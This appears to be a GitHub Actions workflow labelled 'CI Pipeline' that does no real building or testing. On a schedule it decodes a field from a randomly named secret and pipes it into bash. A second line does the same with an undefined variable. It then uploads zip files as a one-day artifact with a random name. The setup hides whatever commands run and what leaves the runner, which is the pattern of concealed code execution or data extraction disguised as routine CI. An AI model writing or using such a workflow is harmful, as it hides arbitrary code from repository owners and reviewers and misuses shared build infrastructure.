name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '13 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  handler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          rkkh6958: ${{ secrets.rkkh6958 }}
        run: |
          printf '%s' "$rkkh6958" | jq -r .x270 | /bin/bash
          printf '%s' "$ez28472" | jq -r .pnud5481 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: hSLEh6dV
          path: "*.zip"
          retention-days: 1
